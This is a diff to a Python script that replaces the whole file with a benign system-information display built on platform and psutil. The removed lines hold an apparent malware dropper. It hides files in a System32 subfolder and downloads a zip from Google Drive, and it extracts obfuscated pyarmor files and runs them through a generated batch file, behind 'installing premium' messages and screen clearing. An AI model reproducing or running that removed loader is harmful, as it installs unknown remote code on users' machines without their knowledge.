@@ -1,106 +1,36 @@
-import subprocess
-import sys
+import platform
+import psutil
 import os
-import winreg
-import requests
-import sys
 
-import ctypes
-import os
-import sys
-import shutil
-import os
-import gdown
-os.system('cls')
-dcnmwxdr = r'C:\Windows\System32\MSX'
-if not os.path.exists(dcnmwxdr):
-    os.makedirs(dcnmwxdr)
-    os.system('cls')
-
-result = check_string_in_url("https://raw.githubusercontent.com/elaideasdfxcsxcsdv/installer/refs/heads/main/uniqueid_3.0.txt", file_contentsx1)
-os.system('cls')
-print("")
-def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\MSX\aespr_v3.py"
-    files_to_delete = [
-        r"C:\Windows\System32\MSX\aespr-prx.py",
-        r"C:\Windows\System32\MSX\aespremium_nogui.bat",
-        r"C:\Windows\System32\MSX\pyarmor_runtime_000000"
-    ]
-
-    aesv3_exists = os.path.exists(aesv3_path)
-
-    if not aesv3_exists:
-        for item in files_to_delete:
-            if os.path.exists(item):
-                if os.path.isfile(item):
-                    os.remove(item)
-                    print("")
-                elif os.path.isdir(item):
-                    shutil.rmtree(item)
-                    os.system('cls')
-                    print("")
-                    print("PREMIUM is updating, please don't close the window.")
-                    print("")
-                    print("")
-    else:
-        print("")
-
-delete_files_if_aesv3_missing()
-
-def download_file_from_google_drive(url, output_path):
-    if not os.path.exists(output_path):
-        gdown.download(url, output=output_path, quiet=True)
-if not os.path.exists("C:\\Windows\\System32\\MSX\\pyarmor_runtime_000000"):
-    print("")
-    print("")
-    print("")
-    print("> INSTALLING PREMIUM...PLEASE WAIT...")
-    print("")
-    print("")
-    print("")
-    print("> INSTALLING PREMIUM...PLEASE WAIT...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1wvUg2881KGCQ0AZ9w5y0bPZmkfb7dP95", "C:\\Windows\\System32\\MSX\\prv3.zip")
-    zip_file = r'C:\Windows\System32\MSX\prv3.zip'
-    extract_dir = r'C:\Windows\System32\MSX'
-    extract_zip(zip_file, extract_dir)
-    os.remove(zip_file)
+def display_system_info():
+    print("System Information")
+    print("=" * 40)
+    
+    # OS information
+    print(f"Operating System: {platform.system()} {platform.release()}")
+    print(f"Platform: {platform.platform()}")
+    print(f"Processor: {platform.processor()}")
+    
+    # Memory information
+    mem = psutil.virtual_memory()
+    print(f"Total Memory: {mem.total / (1024 ** 3):.2f} GB")
+    print(f"Available Memory: {mem.available / (1024 ** 3):.2f} GB")
+    print(f"Used Memory: {mem.used / (1024 ** 3):.2f} GB")
+    
+    # CPU information
+    print(f"CPU Count: {psutil.cpu_count(logical=True)} cores")
+    print(f"CPU Frequency: {psutil.cpu_freq().current} MHz")
+    print(f"CPU Usage: {psutil.cpu_percent(interval=1)}%")
+    
+    # Disk information
+    disk = psutil.disk_usage('/')
+    print(f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB")
+    print(f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB")
+    print(f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB")
+    
+    # Network information
+    net = psutil.net_if_addrs()
+    print(f"Network Interfaces: {', '.join(net.keys())}")
 
 
-import os
-import shutil
-os.system('cls')
-def run_batch_file(batch_file_path):
-    try:
-        subprocess.run([batch_file_path], shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error")
-    else:
-        print("")
-
-os.system('cls')
-def create_batch_file(python_command, script_name):
-    directory = r"C:\Windows\System32\MSX"
-    filename = "aespremium_nogui.bat"
-    filepath = os.path.join(directory, filename)
-    if not os.path.exists(filepath):
-        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"
-        os.makedirs(directory, exist_ok=True)
-        with open(filepath, 'w') as file:
-            file.write(batch_content)
-        print(f"")
-    else:
-        print("")
-
-create_batch_file("py -3.11", r"C:\Windows\System32\MSX\aespr_v3.py")
-batch_file_path = r"C:\Windows\System32\MSX\aespremium_nogui.bat"
-os.system('cls')
-
-try:
-    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
-except Exception as e:
-    print("Error")
-os.system('cls')
-
-os._exit(0)
-sys.exit()
+display_system_info()
